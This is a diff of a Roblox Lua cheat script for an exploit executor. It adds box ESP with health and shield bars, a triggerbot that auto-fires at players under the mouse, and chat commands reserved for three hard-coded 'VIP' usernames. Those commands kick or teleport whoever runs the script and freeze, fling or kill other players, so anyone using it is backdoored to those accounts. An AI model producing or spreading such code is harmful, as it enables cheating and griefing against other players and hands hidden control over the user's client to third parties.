@@ -1,103 +1,25 @@
--- Full fixed script: VIP commands + Triggerbot + BOX ESP (no chams)
--- Added: .h partialName = add ESP (first partial match)
---        .j partialName = remove ESP for specific player (first partial match) OR .j alone removes all
---        .g = instant teleport to VIP (auto deattach if teleport succeeds)
--- No prints. Safety pcall usage to avoid runtime errors.
+-- Full VIP script: Commands + Triggerbot + Box ESP with Shield + .k kick
 
 -- Services & basics
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local Camera = workspace.CurrentCamera
 
 -- State / settings
-local VIPUsers = { "draconvm", "K3TCHUPSS", "ocaptonur05" } -- VIP names (case-insensitive compare)
-local BringTargets = {}      -- players to "bring" (legacy / fallback)
-local FrozenPlayers = {}     -- anchored players
-local targetedPlayers = {}   -- map of player.Name -> true for players with ESP
--- espObjects: maps Player -> { mode='drawing'|'gui', data=... }
+local VIPUsers = { "draconvm", "K3TCHUPSS", "ocaptonur05" }
+local BringTargets = {}
+local FrozenPlayers = {}
+local targetedPlayers = {} -- Only players with ESP
 local espObjects = {}
-local lastTargetedPlayerName = nil
 
 --------------------------------------------------------------------------------
--- Helper utilities (VIP functions)
---------------------------------------------------------------------------------
-local function teleportToPlayer(targetName)
-    local targetPlayer = Players:FindFirstChild(targetName)
-    local myChar = LocalPlayer.Character
-    if targetPlayer and targetPlayer.Character and myChar then
-        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
-        if targetRoot and myRoot then
-            pcall(function() myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0) end)
-        end
-    end
-end
-
-local function freezeAllPlayers(senderName)
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
-            local root = player.Character:FindFirstChild("HumanoidRootPart")
-            if root then
-                root.Anchored = true
-                FrozenPlayers[player.Name] = true
-            end
-        end
-    end
-end
-
-local function unfreezeAllPlayers(senderName)
-    for name,_ in pairs(FrozenPlayers) do
-        if name ~= senderName then
-            local player = Players:FindFirstChild(name)
-            if player and player.Character then
-                local root = player.Character:FindFirstChild("HumanoidRootPart")
-                if root then pcall(function() root.Anchored = false end) end
-            end
-            FrozenPlayers[name] = nil
-        end
-    end
-end
-
-local function killAllOtherPlayers(senderName)
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name ~= senderName then
-            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-            if hum then
-                pcall(function() hum.Health = 0 end)
-            end
-        end
-    end
-end
-
-local function flingPlayer(player)
-    if player and player.Character then
-        local root = player.Character:FindFirstChild("HumanoidRootPart")
-        if root then
-            local ok, _ = pcall(function()
-                local bv = Instance.new("BodyVelocity")
-                bv.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
-                bv.MaxForce = Vector3.new(1e6,1e6,1e6)
-                bv.P = 1e5
-                bv.Parent = root
-                task.delay(0.3, function() pcall(function() if bv and bv.Parent then bv:Destroy() end end) end)
-            end)
-            if not ok then
-                -- ignore
-            end
-        end
-    end
-end
-
---------------------------------------------------------------------------------
--- Drawing availability & helpers
+-- Helpers: 3D->2D
 --------------------------------------------------------------------------------
 local DrawingAvailable = false
-pcall(function()
-    if Drawing and Drawing.new then DrawingAvailable = true end
-end)
+pcall(function() if Drawing and Drawing.new then DrawingAvailable = true end end)
 
 local function wtvp(pos3)
     local a, onScreen = Camera:WorldToViewportPoint(pos3)
@@ -106,388 +28,268 @@ end
 
 local function createBoxDrawings()
     if not DrawingAvailable then return nil end
-    local okBox, box = pcall(Drawing.new, "Square")
-    local okOut, outline = pcall(Drawing.new, "Square")
-    local okTxt, txt = pcall(Drawing.new, "Text")
-    local okHealth, health = pcall(Drawing.new, "Square")
-    if not okBox or not okOut or not okTxt or not okHealth then
-        if box then pcall(function() box:Remove() end) end
-        if outline then pcall(function() outline:Remove() end) end
-        if txt then pcall(function() txt:Remove() end) end
-        if health then pcall(function() health:Remove() end) end
-        return nil
-    end
+    local box = Drawing.new("Square")
+    local outline = Drawing.new("Square")
+    local txt = Drawing.new("Text")
+    local health = Drawing.new("Square")
+    local shield = Drawing.new("Square")
 
-    -- Box
-    box.Thickness = 1
-    box.Filled = false
-    box.Color = Color3.fromRGB(255,0,0)
-    box.Visible = false
-    box.ZIndex = 2
+    box.Thickness = 1 box.Filled = false box.Color = Color3.fromRGB(255,0,0) box.Visible = false
+    outline.Thickness = 3 outline.Filled = false outline.Color = Color3.new(0,0,0) outline.Visible = false
+    txt.Size = 13 txt.Color = Color3.fromRGB(255,255,255) txt.Center = true txt.Outline = true txt.Visible = false
+    health.Thickness = 4 health.Filled = true health.Color = Color3.fromRGB(0,255,0) health.Visible = false
+    shield.Thickness = 4 shield.Filled = true shield.Color = Color3.fromRGB(0,0,255) shield.Visible = false
 
-    -- Outline
-    outline.Thickness = 3
-    outline.Filled = false
-    outline.Color = Color3.new(0,0,0)
-    outline.Visible = false
-    outline.ZIndex = 1
-
-    -- Name text
-    txt.Size = 13
-    txt.Color = Color3.fromRGB(255,255,255)
-    txt.Center = true
-    txt.Outline = true
-    txt.Visible = false
-    txt.ZIndex = 3
-    txt.Text = ""
-
-    -- Health bar (outside the box)
-    health.Thickness = 4
-    health.Filled = true
-    health.Color = Color3.fromRGB(0,255,0)
-    health.Visible = false
-    health.ZIndex = 4
-
-    return {Box = box, Outline = outline, Text = txt, Health = health}
-end
-
-local function createBillboardGui()
-    local gui = Instance.new("BillboardGui")
-    gui.Name = "WaveESP"
-    gui.Size = UDim2.new(0,120,0,26)
-    gui.StudsOffset = Vector3.new(0,2.2,0)
-    gui.AlwaysOnTop = true
-    gui.MaxDistance = 1000
-    pcall(function() gui.Parent = game:GetService("CoreGui") end)
-
-    local label = Instance.new("TextLabel", gui)
-    label.Size = UDim2.new(1,0,1,0)
-    label.BackgroundTransparency = 1
-    label.TextColor3 = Color3.fromRGB(255,255,255)
-    label.TextStrokeTransparency = 0.8
-    label.TextStrokeColor3 = Color3.new(0,0,0)
-    label.TextScaled = false
-    label.TextSize = 14
-    label.Font = Enum.Font.SourceSansBold
-    label.Text = ""
-
-    return {Gui = gui, Label = label, Conn = nil}
+    return {Box=box,Outline=outline,Text=txt,Health=health,Shield=shield}
 end
 
 --------------------------------------------------------------------------------
--- addESP / removeESP
+-- ESP functions
 --------------------------------------------------------------------------------
-local function addESP(targetPlayer)
-    if not targetPlayer then return end
-    if espObjects[targetPlayer] then return end
-
-    if DrawingAvailable then
-        local drawings = createBoxDrawings()
-        if drawings then
-            espObjects[targetPlayer] = { mode = "drawing", data = drawings }
-            return
-        end
+local function addESP(player)
+    if espObjects[player] then return end
+    if not targetedPlayers[player.Name] then return end
+    local drawings = createBoxDrawings()
+    if drawings then
+        espObjects[player] = { mode="drawing", data=drawings }
     end
-
-    local guiData = createBillboardGui()
-    guiData.Conn = RunService.RenderStepped:Connect(function()
-        if not targetPlayer or not targetPlayer.Character then return end
-        local head = targetPlayer.Character:FindFirstChild("Head")
-        if head and guiData and guiData.Gui then
-            pcall(function() guiData.Gui.Adornee = head end)
-            guiData.Label.Text = (targetPlayer.DisplayName or targetPlayer.Name) .. " (@" .. targetPlayer.Name .. ")"
-        end
-    end)
-    espObjects[targetPlayer] = { mode = "gui", data = guiData }
 end
 
-local function removeESP(targetPlayer)
-    local obj = espObjects[targetPlayer]
+local function removeESP(player)
+    local obj = espObjects[player]
     if not obj then return end
-
-    if obj.mode == "drawing" and obj.data then
-        local d = obj.data
-        if d.Box then pcall(function() d.Box:Remove() end) end
-        if d.Outline then pcall(function() d.Outline:Remove() end) end
-        if d.Text then pcall(function() d.Text:Remove() end) end
-        if d.Health then pcall(function() d.Health:Remove() end) end
-    elseif obj.mode == "gui" and obj.data then
-        local g = obj.data
-        if g.Conn then pcall(function() g.Conn:Disconnect() end) end
-        if g.Gui and g.Gui.Parent then pcall(function() g.Gui:Destroy() end) end
-    end
-
-    espObjects[targetPlayer] = nil
+    local d = obj.data
+    for _,v in pairs(d) do if v and v.Remove then pcall(function() v:Remove() end) end end
+    espObjects[player] = nil
 end
 
---------------------------------------------------------------------------------
--- Drawing update loop
---------------------------------------------------------------------------------
+-- Update ESP
 if DrawingAvailable then
     RunService:BindToRenderStep("WaveBoxESP", Enum.RenderPriority.Camera.Value, function()
-        for player, obj in pairs(espObjects) do
-            if obj and obj.mode == "drawing" and obj.data then
-                local d = obj.data
-                if not player or not player.Character then
-                    d.Box.Visible = false
-                    d.Outline.Visible = false
-                    d.Text.Visible = false
-                    d.Health.Visible = false
-                else
-                    local root = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("Head") or player.Character.PrimaryPart
-                    local hum = player.Character:FindFirstChildOfClass("Humanoid")
-                    if not root or not hum then
-                        d.Box.Visible = false
-                        d.Outline.Visible = false
-                        d.Text.Visible = false
-                        d.Health.Visible = false
-                    else
-                        local screenPos, onScreen, depth = wtvp(root.Position)
-                        if onScreen and depth > 0 then
-                            local scaleFactor = 1 / (depth * math.tan(math.rad(Camera.FieldOfView / 2)) * 2) * 1000
-                            local width = math.max(12, math.floor(4 * scaleFactor))
-                            local height = math.max(14, math.floor(5 * scaleFactor))
+        for player,obj in pairs(espObjects) do
+            local d = obj.data
+            if not player or not player.Character then
+                for _,v in pairs(d) do if v then v.Visible = false end end
+            else
+                local root = player.Character:FindFirstChild("HumanoidRootPart") or player.Character.PrimaryPart
+                local hum = player.Character:FindFirstChildOfClass("Humanoid")
+                if root and hum then
+                    local screenPos, onScreen, depth = wtvp(root.Position)
+                    if onScreen and depth > 0 then
+                        local scaleFactor = 1 / (depth * math.tan(math.rad(Camera.FieldOfView/2))*2)*1000
+                        local width = math.max(12, math.floor(4*scaleFactor))
+                        local height = math.max(14, math.floor(5*scaleFactor))
 
-                            d.Box.Size = Vector2.new(width, height)
-                            d.Box.Position = Vector2.new(math.floor(screenPos.X - width / 2), math.floor(screenPos.Y - height / 2))
-                            d.Box.Visible = true
-                            d.Box.Color = (player.TeamColor and player.TeamColor.Color) or Color3.fromRGB(255,0,0)
+                        -- Box
+                        d.Box.Size = Vector2.new(width,height)
+                        d.Box.Position = Vector2.new(screenPos.X-width/2,screenPos.Y-height/2)
+                        d.Box.Visible = true
+                        d.Box.Color = (player.TeamColor and player.TeamColor.Color) or Color3.fromRGB(255,0,0)
 
-                            d.Outline.Size = d.Box.Size
-                            d.Outline.Position = d.Box.Position
-                            d.Outline.Visible = true
+                        -- Outline
+                        d.Outline.Size = d.Box.Size
+                        d.Outline.Position = d.Box.Position
+                        d.Outline.Visible = true
 
-                            d.Text.Text = (player.DisplayName or player.Name) .. " (@" .. player.Name .. ")"
-                            d.Text.Position = Vector2.new(math.floor(screenPos.X), math.floor(screenPos.Y - height - 10))
-                            d.Text.Visible = true
+                        -- Name
+                        d.Text.Text = (player.DisplayName or player.Name).." (@"..player.Name..")"
+                        d.Text.Position = Vector2.new(screenPos.X, screenPos.Y - height - 10)
+                        d.Text.Visible = true
 
-                            local healthPercent = math.clamp((hum.Health or 0) / (hum.MaxHealth or 1), 0, 1)
-                            local healthWidth = math.max(1, math.floor(width * healthPercent))
-                            d.Health.Size = Vector2.new(healthWidth, 4)
-                            d.Health.Position = Vector2.new(math.floor(screenPos.X - width / 2), math.floor(screenPos.Y + height / 2 + 2))
-                            if healthPercent > 0.6 then
-                                d.Health.Color = Color3.fromRGB(0,255,0)
-                            elseif healthPercent > 0.3 then
-                                d.Health.Color = Color3.fromRGB(255,255,0)
-                            else
-                                d.Health.Color = Color3.fromRGB(255,0,0)
+                        -- Health
+                        local healthPercent = math.clamp(hum.Health / (hum.MaxHealth or 1),0,1)
+                        d.Health.Size = Vector2.new(math.max(1,math.floor(width*healthPercent)),4)
+                        d.Health.Position = Vector2.new(screenPos.X-width/2, screenPos.Y+height/2+2)
+                        d.Health.Color = (healthPercent>0.6 and Color3.fromRGB(0,255,0)) or (healthPercent>0.3 and Color3.fromRGB(255,255,0)) or Color3.fromRGB(255,0,0)
+                        d.Health.Visible = true
+
+                        -- Shield
+                        local state = player:FindFirstChild("DataFolder") and player.DataFolder:FindFirstChild("Information")
+                        local shieldObj = state and state:FindFirstChild("ShieldSave")
+                        local shieldPercent = 0
+                        if shieldObj then
+                            if shieldObj:IsA("NumberValue") then
+                                shieldPercent = math.clamp(shieldObj.Value / (shieldObj.MaxValue or 100),0,1)
+                            elseif shieldObj:IsA("IntValue") then
+                                shieldPercent = math.clamp(shieldObj.Value/100,0,1)
+                            elseif shieldObj:IsA("BoolValue") then
+                                shieldPercent = shieldObj.Value and 1 or 0
                             end
-                            d.Health.Visible = true
-                        else
-                            d.Box.Visible = false
-                            d.Outline.Visible = false
-                            d.Text.Visible = false
-                            d.Health.Visible = false
                         end
+                        d.Shield.Size = Vector2.new(math.max(1, math.floor(width*shieldPercent)),4)
+                        d.Shield.Position = Vector2.new(screenPos.X-width/2, screenPos.Y+height/2+8)
+                        d.Shield.Visible = shieldPercent>0
+                    else
+                        for _,v in pairs(d) do if v then v.Visible=false end end
                     end
+                else
+                    for _,v in pairs(d) do if v then v.Visible=false end end
                 end
             end
         end
     end)
 end
-
---------------------------------------------------------------------------------
--- Smooth bring loop
---------------------------------------------------------------------------------
-RunService.RenderStepped:Connect(function()
-    for targetName, _ in pairs(BringTargets) do
-        local targetPlayer = Players:FindFirstChild(targetName)
-        for _, vipName in ipairs(VIPUsers) do
-            local vipPlayer = Players:FindFirstChild(vipName)
-            if vipPlayer and vipPlayer.Character and targetPlayer and targetPlayer.Character and targetPlayer ~= vipPlayer then
-                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
-                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-                if vipRoot and targetRoot then
-                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
-                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
-                end
-            end
-        end
-    end
-end)
 
 --------------------------------------------------------------------------------
 -- Triggerbot
 --------------------------------------------------------------------------------
-local TriggerBot = { Enabled = false, Connections = {}, BlacklistCache = {} }
-TriggerBot.Settings = { Keybind = Enum.KeyCode.Q, Blacklisted = { "Knife" } }
-for _, itemName in ipairs(TriggerBot.Settings.Blacklisted) do
-    TriggerBot.BlacklistCache[itemName:lower()] = true
-end
-
-local function IsToolBlacklisted(tool)
-    return tool and TriggerBot.BlacklistCache[tool.Name:lower()]
-end
-
-local function IsValidTarget(player)
-    if not player or player == LocalPlayer then return false end
-    local char = player.Character
-    if not char then return false end
-    local be = char:FindFirstChild("BodyEffects")
-    if be then
-        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
-        if ko and ko.Value then return false end
-    end
-    local hum = char:FindFirstChild("Humanoid")
-    if hum and hum.Health <= 0 then return false end
-    return true
-end
-
+local TriggerBot = { Enabled=false }
 local function GetTargetFromMouse()
     local target = Mouse.Target
     if not target then return nil end
-    for _,player in ipairs(Players:GetPlayers()) do
-        if player.Character and target:IsDescendantOf(player.Character) and IsValidTarget(player) then
-            return player, target
+    for _,p in ipairs(Players:GetPlayers()) do
+        if p.Character and target:IsDescendantOf(p.Character) and p ~= LocalPlayer then
+            return p
         end
     end
-    return nil
 end
 
 local function GetEquippedTool()
     local char = LocalPlayer.Character
     if not char then return nil end
     for _, tool in ipairs(char:GetChildren()) do
-        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then return tool end
+        if tool:IsA("Tool") then return tool end
     end
-    return nil
 end
 
-local function Execute()
+local function ExecuteTrigger()
     if not TriggerBot.Enabled then return end
-    local targetPlayer, _ = GetTargetFromMouse()
-    if not targetPlayer then return end
+    local target = GetTargetFromMouse()
+    if not target then return end
     local tool = GetEquippedTool()
-    if tool then
-        pcall(function() tool:Activate() end)
-    end
+    if tool then pcall(function() tool:Activate() end) end
 end
-
-function TriggerBot:Toggle(state)
-    if state ~= nil then
-        self.Enabled = state
-    else
-        self.Enabled = not self.Enabled
-    end
-end
-
-TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input, gp)
+RunService.RenderStepped:Connect(ExecuteTrigger)
+UserInputService.InputBegan:Connect(function(input, gp)
     if gp then return end
-    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == TriggerBot.Settings.Keybind then
-        TriggerBot:Toggle()
+    if input.UserInputType==Enum.UserInputType.Keyboard and input.KeyCode==Enum.KeyCode.Q then
+        TriggerBot.Enabled = not TriggerBot.Enabled
     end
 end)
-TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(Execute)
-
-getgenv().DisableTriggerBot = function()
-    for _,conn in pairs(TriggerBot.Connections) do
-        pcall(function() if conn and conn.Disconnect then conn:Disconnect() end end)
-    end
-    TriggerBot.Enabled = false
-end
 
 --------------------------------------------------------------------------------
--- Chat commands (VIP only)
+-- VIP chat commands
 --------------------------------------------------------------------------------
-local function onMessage(sender, msg)
+local function onMessage(sender,msg)
     local vip = false
-    for _, v in ipairs(VIPUsers) do
-        if sender:lower() == v:lower() then vip = true break end
-    end
+    for _,v in ipairs(VIPUsers) do if sender:lower()==v:lower() then vip=true break end end
     if not vip then return end
 
     local args = msg:split(" ")
     local cmd = args[1] and args[1]:lower() or ""
 
-    if cmd == ".h" and args[2] then
-        local partialName = args[2]
-        for _, p in ipairs(Players:GetPlayers()) do
-            if (p.Name:lower():find(partialName:lower()) or p.DisplayName:lower():find(partialName:lower())) and not targetedPlayers[p.Name] then
-                targetedPlayers[p.Name] = true
-                lastTargetedPlayerName = p.Name
-                pcall(function() addESP(p) end)
+    if cmd==".h" and args[2] then
+        local partial = args[2]:lower()
+        for _,p in ipairs(Players:GetPlayers()) do
+            if (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) and not targetedPlayers[p.Name] then
+                targetedPlayers[p.Name]=true
+                addESP(p)
                 break
             end
         end
 
-    elseif cmd == ".j" then
-        local partialName = args[2]
-        if partialName then
-            for _, p in ipairs(Players:GetPlayers()) do
-                if (p.Name:lower():find(partialName:lower()) or p.DisplayName:lower():find(partialName:lower())) and targetedPlayers[p.Name] then
-                    targetedPlayers[p.Name] = nil
-                    pcall(function() removeESP(p) end)
-                    if lastTargetedPlayerName == p.Name then lastTargetedPlayerName = nil end
+    elseif cmd==".j" then
+        local partial = args[2] and args[2]:lower()
+        if partial then
+            for _,p in ipairs(Players:GetPlayers()) do
+                if (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) and targetedPlayers[p.Name] then
+                    targetedPlayers[p.Name]=nil
+                    removeESP(p)
                     break
                 end
             end
         else
             for name,_ in pairs(targetedPlayers) do
-                local t = Players:FindFirstChild(name)
-                if t then pcall(function() removeESP(t) end) end
-                targetedPlayers[name] = nil
+                local p = Players:FindFirstChild(name)
+                if p then removeESP(p) end
+                targetedPlayers[name]=nil
             end
-            lastTargetedPlayerName = nil
         end
 
-    elseif cmd == ".k" and LocalPlayer.Name:lower() ~= sender:lower() then
-        pcall(function() LocalPlayer:Kick("Kicked by VIP") end)
-
-    elseif cmd == ".g" then
-        -- Attempt immediate teleport to VIP sender and don't stick.
+    -- NEW: .k VIP kick
+    elseif cmd==".k" then
         if LocalPlayer.Name ~= sender then
+            pcall(function()
+                LocalPlayer:Kick("Kicked by VIP: "..sender)
+            end)
+        end
+
+    elseif cmd==".g" then
+        if LocalPlayer.Name~=sender then
             local vipPlayer = Players:FindFirstChild(sender)
             if vipPlayer and vipPlayer.Character and LocalPlayer.Character then
                 local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                 local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                 if myRoot and vipRoot then
                     pcall(function() myRoot.CFrame = vipRoot.CFrame + Vector3.new(0,3,0) end)
-                    -- auto deattach: do not set BringTargets
-                else
-                    -- fallback behavior: if parts missing, use BringTargets as before
-                    BringTargets[LocalPlayer.Name] = true
                 end
-            else
-                -- fallback: if VIP not found or char missing, set BringTargets
-                BringTargets[LocalPlayer.Name] = true
             end
         end
 
-    elseif cmd == ".s" then
-        BringTargets[LocalPlayer.Name] = nil
-
-    elseif cmd == ".f" then
-        freezeAllPlayers(sender)
-
-    elseif cmd == ".u" then
-        unfreezeAllPlayers(sender)
-
-    elseif cmd == ".tp" and args[2] then
-        if LocalPlayer.Name ~= sender then teleportToPlayer(args[2]) end
-
-    elseif cmd == ".fling" then
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p.Name ~= sender then pcall(function() flingPlayer(p) end) end
+    elseif cmd==".f" then
+        for _,p in ipairs(Players:GetPlayers()) do
+            if p.Character and p.Name~=sender then
+                local root = p.Character:FindFirstChild("HumanoidRootPart")
+                if root then root.Anchored=true end
+                FrozenPlayers[p.Name]=true
+            end
         end
 
-    elseif cmd == ".r" then
-        if LocalPlayer.Name ~= sender then killAllOtherPlayers(sender) end
+    elseif cmd==".u" then
+        for name,_ in pairs(FrozenPlayers) do
+            local p = Players:FindFirstChild(name)
+            if p and p.Character then
+                local root = p.Character:FindFirstChild("HumanoidRootPart")
+                if root then pcall(function() root.Anchored=false end) end
+            end
+            FrozenPlayers[name]=nil
+        end
+
+    elseif cmd==".tp" and args[2] then
+        local target = Players:FindFirstChild(args[2])
+        if target then
+            local myChar = LocalPlayer.Character
+            if myChar and target.Character then
+                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+                local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                if myRoot and targetRoot then
+                    pcall(function() myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0) end)
+                end
+            end
+        end
+
+    elseif cmd==".fling" then
+        for _,p in ipairs(Players:GetPlayers()) do
+            if p.Name~=sender and p.Character then
+                local root = p.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-1500,1500),800,math.random(-1500,1500))
+                    bv.MaxForce = Vector3.new(1e6,1e6,1e6)
+                    bv.Parent=root
+                    task.delay(0.3,function() pcall(function() if bv.Parent then bv:Destroy() end end) end)
+                end
+            end
+        end
+
+    elseif cmd==".r" then
+        for _,p in ipairs(Players:GetPlayers()) do
+            if p.Name~=sender and p.Character then
+                local hum = p.Character:FindFirstChildOfClass("Humanoid")
+                if hum then pcall(function() hum.Health=0 end) end
+            end
+        end
     end
 end
 
-local function hookPlayer(plr)
-    pcall(function()
-        plr.Chatted:Connect(function(msg) onMessage(plr.Name, msg) end)
-    end)
+-- Hook chat
+for _,p in ipairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) onMessage(p.Name,msg) end)
 end
-
--- Hook existing players & listen for joins
-for _, p in ipairs(Players:GetPlayers()) do
-    hookPlayer(p)
-end
-Players.PlayerAdded:Connect(hookPlayer)
-
-Players.PlayerRemoving:Connect(function(plr)
-    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name] = nil end
-    pcall(function() removeESP(plr) end)
+Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) onMessage(p.Name,msg) end)
+end)
+Players.PlayerRemoving:Connect(function(p)
+    if targetedPlayers[p.Name] then targetedPlayers[p.Name]=nil end
+    removeESP(p)
 end)
